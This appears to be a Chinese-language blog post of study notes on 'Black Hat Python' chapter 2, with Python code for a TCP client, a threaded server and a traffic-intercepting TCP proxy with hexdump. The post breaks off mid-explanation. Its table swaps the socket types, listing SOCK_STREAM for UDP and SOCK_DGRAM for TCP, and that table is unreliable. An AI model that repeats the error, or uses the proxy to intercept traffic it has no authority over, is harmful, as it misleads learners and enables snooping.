<!DOCTYPE html>
<html lang="zh-tw">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.0.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">
  <meta name="google-site-verification" content="AEpTGuQAkxnTOlmfF4INDna3S660LxrkyZ4BQzVbRSw">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"littlebees.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
  </script>

  <meta name="description" content="動機 來做個筆記吧 這裡有帶到基本的network programming與SSH的使用">
<meta property="og:type" content="article">
<meta property="og:title" content="blackhat python - network programming">
<meta property="og:url" content="https://littlebees.github.io/2020/9/python-black-hat-np/index.html">
<meta property="og:site_name" content="記事本">
<meta property="og:description" content="動機 來做個筆記吧 這裡有帶到基本的network programming與SSH的使用">
<meta property="og:locale" content="zh_TW">
<meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/7/71/IPv4_Packet_-en.svg/1280px-IPv4_Packet_-en.svg.png">
<meta property="article:published_time" content="2020-09-04T13:16:58.000Z">
<meta property="article:modified_time" content="2022-03-14T07:21:31.915Z">
<meta property="article:author" content="zhengcf">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/7/71/IPv4_Packet_-en.svg/1280px-IPv4_Packet_-en.svg.png">

<link rel="canonical" href="https://littlebees.github.io/2020/9/python-black-hat-np/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-tw'
  };
</script>

  <title>blackhat python - network programming | 記事本</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">記事本</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">寫下來，不然會忘</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
        <li class="menu-item menu-item-sitemap">

    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-tw">
    <link itemprop="mainEntityOfPage" href="https://littlebees.github.io/2020/9/python-black-hat-np/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhengcf">
      <meta itemprop="description" content="想到什麼就寫什麼">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="記事本">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          blackhat python - network programming
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-09-04 21:16:58" itemprop="dateCreated datePublished" datetime="2020-09-04T21:16:58+08:00">2020-09-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-03-14 15:21:31" itemprop="dateModified" datetime="2022-03-14T15:21:31+08:00">2022-03-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Python/" itemprop="url" rel="index"><span itemprop="name">Python</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Python/Reading/" itemprop="url" rel="index"><span itemprop="name">Reading</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h2 id="動機-660">動機</h2>
<p>來做個筆記吧</p>
<p>這裡有帶到基本的network programming與SSH的使用</p>
<span id="more"></span>
<h2 id="環境-py3">環境 &amp; py3</h2>
<p>書上的code是py2，同時code很舊，因此會用<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0VPTlJhaWRlci9ibGFja2hhdC1weXRob24z">這個repo<i class="fa fa-external-link-alt"></i></span>的code來解釋</p>
<p>用WSL2測試</p>
<h2 id="CH2">CH2</h2>
<h3 id="基本的TCP-client-server">基本的TCP client&amp;server</h3>
<p>tcp_client.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">target_host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">target_port = <span class="number">9999</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># create a socket object</span></span><br><span class="line">client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="comment"># client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># connect the client</span></span><br><span class="line">client.connect((target_host, target_port))</span><br><span class="line"><span class="comment"># NULL!!!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># send some data</span></span><br><span class="line">client.send(<span class="string">b&quot;GET / HTTP/1.1\r\nHost: google.com\r\n\r\n&quot;</span>)</span><br><span class="line"><span class="comment"># client.sendto(b&quot;AAABBBCCC&quot;, (target_host, target_port))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># receive data</span></span><br><span class="line">response = client.recv(<span class="number">4096</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response)</span><br></pre></td></tr></table></figure>
<p>UDP &amp; TCP client的差別在</p>
<table>
<thead>
<tr>
<th></th>
<th>socket (創socket時)</th>
<th>connect (與server建立連線，三段握手)</th>
<th>send (送資料)</th>
</tr>
</thead>
<tbody>
<tr>
<td>UDP</td>
<td>SOCK_STREAM</td>
<td>不用</td>
<td>sendto(data, tuple)</td>
</tr>
<tr>
<td>TCP</td>
<td>SOCK_DGRAM</td>
<td><code>connect((target_host, target_port))</code></td>
<td>send(data)</td>
</tr>
</tbody>
</table>
<hr>
<p>tcp_server.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">bind_ip = <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">bind_port = <span class="number">9999</span></span><br><span class="line"></span><br><span class="line">server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">server.bind((bind_ip, bind_port))</span><br><span class="line"></span><br><span class="line">server.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Listening on %s:%d&quot;</span> % (bind_ip, bind_port))</span><br><span class="line"></span><br><span class="line"><span class="comment"># this is our client handling thread</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle_client</span>(<span class="params">client_socket</span>):</span></span><br><span class="line">    <span class="comment"># just print out what the client sends</span></span><br><span class="line">    request = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Received: %s&quot;</span> % request)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># send back a packet</span></span><br><span class="line">    client_socket.send(<span class="string">b&quot;ACK!&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(client_socket.getpeername())</span><br><span class="line">    client_socket.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    client, addr = server.accept()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Accepted connection from: %s:%d&quot;</span> % (addr[<span class="number">0</span>], addr[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># spin up our client thread to handle incoming data</span></span><br><span class="line">    client_handler = threading.Thread(target=handle_client, args=(client,))</span><br><span class="line">    client_handler.start()</span><br></pre></td></tr></table></figure>
<p>這裡是用thread來處理每個進來的連線，之後會看到在同一個thread(就原本收連線的thread)處理每個進來的連線的手法(select,epool)</p>
<hr>
<p>tcp_proxy.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># this is a pretty hex dumping function directly taken from</span></span><br><span class="line"><span class="comment"># http://code.activestate.com/recipes/142812-hex-dumper/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hexdump</span>(<span class="params">src, length=<span class="number">16</span></span>):</span></span><br><span class="line">    result = []</span><br><span class="line">    digits = <span class="number">4</span> <span class="keyword">if</span> <span class="built_in">isinstance</span>(src, <span class="built_in">str</span>) <span class="keyword">else</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(src), length):</span><br><span class="line">        s = src[i:i + length]</span><br><span class="line">        hexa = <span class="string">b&#x27; &#x27;</span>.join([<span class="string">b&quot;%0*X&quot;</span> % (digits, <span class="built_in">ord</span>(x)) <span class="keyword">for</span> x <span class="keyword">in</span> s])</span><br><span class="line">        text = <span class="string">b&#x27;&#x27;</span>.join([x <span class="keyword">if</span> <span class="number">0x20</span> &lt;= <span class="built_in">ord</span>(x) &lt; <span class="number">0x7F</span> <span class="keyword">else</span> <span class="string">b&#x27;.&#x27;</span> <span class="keyword">for</span> x <span class="keyword">in</span> s])</span><br><span class="line">        result.append(</span><br><span class="line">            <span class="string">b&quot;%04X   %-*s   %s&quot;</span> % (i, length * (digits + <span class="number">1</span>), hexa, text))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">b&#x27;\n&#x27;</span>.join(result))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">receive_from</span>(<span class="params">connection</span>):</span></span><br><span class="line">    buffer = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># We set a 2 second time-out. Depending on your target this may need</span></span><br><span class="line">    <span class="comment"># to be adjusted</span></span><br><span class="line">    connection.settimeout(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">        <span class="comment"># keep reading into the buffer until there&#x27;s no more data or we</span></span><br><span class="line">        <span class="comment"># time-out</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data = connection.recv(<span class="number">4096</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            buffer += data</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> TimeoutError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> buffer</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># modify any requests destined for the remote host</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">request_handler</span>(<span class="params">buffer</span>):</span></span><br><span class="line">    <span class="comment"># perform packet modifications</span></span><br><span class="line">    <span class="keyword">return</span> buffer</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># modify any responses destined for the local host</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">response_handler</span>(<span class="params">buffer</span>):</span></span><br><span class="line">    <span class="comment"># perform packet modifications</span></span><br><span class="line">    <span class="keyword">return</span> buffer</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proxy_handler</span>(<span class="params">client_socket, remote_host, remote_port, receive_first</span>):</span></span><br><span class="line">    <span class="comment"># connect to the remote host</span></span><br><span class="line">    remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    remote_socket.connect((remote_host, remote_port))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># receive data from the remote end if necessary</span></span><br><span class="line">    <span class="keyword">if</span> receive_first:</span><br><span class="line">        remote_buffer = receive_from(remote_socket)</span><br><span class="line">        hexdump(remote_buffer)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># send it to our response handler</span></span><br><span class="line">        remote_buffer = response_handler(remote_buffer)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># if we have data to send to our local client send it</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(remote_buffer):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[&lt;==] Sending %d bytes to localhost.&quot;</span> % <span class="built_in">len</span>(remote_buffer))</span><br><span class="line">            client_socket.send(remote_buffer)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># now let&#x27;s loop and read from local, send to remote, send to local</span></span><br><span class="line">    <span class="comment"># rinse wash repeat</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># read from local host</span></span><br><span class="line">        local_buffer = receive_from(client_socket)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(local_buffer):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[==&gt;] Received %d bytes from localhost.&quot;</span> % <span class="built_in">len</span>(local_buffer))</span><br><span class="line">            hexdump(local_buffer)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># send it to our request handler</span></span><br><span class="line">            local_buffer = request_handler(local_buffer)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># send off the data to the remote host</span></span><br><span class="line">            remote_socket.send(local_buffer)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[==&gt;] Sent to remote.&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># receive back the response</span></span><br><span class="line">        remote_buffer = receive_from(remote_socket)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(remote_buffer):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[&lt;==] Received %d bytes from remote.&quot;</span> % <span class="built_in">len</span>(remote_buffer))</span><br><span class="line">            hexdump(remote_buffer)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># send to our response handler</span></span><br><span class="line">            remote_buffer = response_handler(remote_buffer)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># send the response to the local socket</span></span><br><span class="line">            client_socket.send(remote_buffer)</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[&lt;==] Sent to localhost.&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># if no more data on either side close the connections</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(local_buffer) <span class="keyword">or</span> <span class="keyword">not</span> <span class="built_in">len</span>(remote_buffer):</span><br><span class="line">            client_socket.close()</span><br><span class="line">            remote_socket.close()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] No more data. Closing connections.&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">server_loop</span>(<span class="params">local_host, local_port, remote_host, remote_port,</span></span></span><br><span class="line"><span class="params"><span class="function">                receive_first</span>):</span></span><br><span class="line">    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        server.bind((local_host, local_port))</span><br><span class="line">    <span class="keyword">except</span> socket.error <span class="keyword">as</span> exc:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!!] Failed to listen on %s:%d&quot;</span> % (local_host,</span><br><span class="line">                                                  local_port))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!!] Check for other listening sockets or correct &quot;</span></span><br><span class="line">              <span class="string">&quot;permissions.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!!] Caught exception error: <span class="subst">&#123;exc&#125;</span>&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Listening on %s:%d&quot;</span> % (local_host, local_port))</span><br><span class="line"></span><br><span class="line">    server.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        client_socket, addr = server.accept()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># print out the local connection information</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[==&gt;] Received incoming connection from %s:%d&quot;</span> % (</span><br><span class="line">            addr[<span class="number">0</span>], addr[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># start a thread to talk to the remote host</span></span><br><span class="line">        proxy_thread = threading.Thread(target=proxy_handler, args=(</span><br><span class="line">            client_socket, remote_host, remote_port, receive_first))</span><br><span class="line">        proxy_thread.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># no fancy command line parsing here</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv[<span class="number">1</span>:]) != <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage: ./proxy.py [localhost] [localport] [remotehost] &quot;</span></span><br><span class="line">              <span class="string">&quot;[remoteport] [receive_first]&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Example: ./proxy.py 127.0.0.1 9000 10.12.132.1 9000 True&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># setup local listening parameters</span></span><br><span class="line">    local_host = sys.argv[<span class="number">1</span>]</span><br><span class="line">    local_port = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># setup remote target</span></span><br><span class="line">    remote_host = sys.argv[<span class="number">3</span>]</span><br><span class="line">    remote_port = <span class="built_in">int</span>(sys.argv[<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># this tells our proxy to connect and receive data</span></span><br><span class="line">    <span class="comment"># before sending to the remote host</span></span><br><span class="line">    receive_first = sys.argv[<span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;True&quot;</span> <span class="keyword">in</span> receive_first:</span><br><span class="line">        receive_first = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        receive_first = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># now spin up our listening socket</span></span><br><span class="line">    server_loop(local_host, local_port, remote_host, remote_port, receive_first)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
<p>proxy的邏輯:<br>
<code>=...=&gt;</code>是網路的部分，<code>-...-&gt;</code>是記憶體讀寫的部分。<br>
開頭有大寫的是程式，開頭有底線是指令。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Client =&gt; Proxy =&gt; Real_server</span><br><span class="line"></span><br><span class="line">看得更細一點</span><br><span class="line"></span><br><span class="line">Client = (proxy_ip,local_port) =&gt; ( _recv - write_buffer -&gt; _send - read_buffer -&gt;) = (server_ip,server_port) =&gt; Real_server</span><br></pre></td></tr></table></figure>
<p>如果自己要玩的話，有個問題是他會先一直讀send的東西到write_buffer，但到什麼時候才要停止?<br>
這尷尬的是client一直send卻沒有停下來的訊號，要做出這個訊號要利用<code>shutdown</code><br>
如下</p>
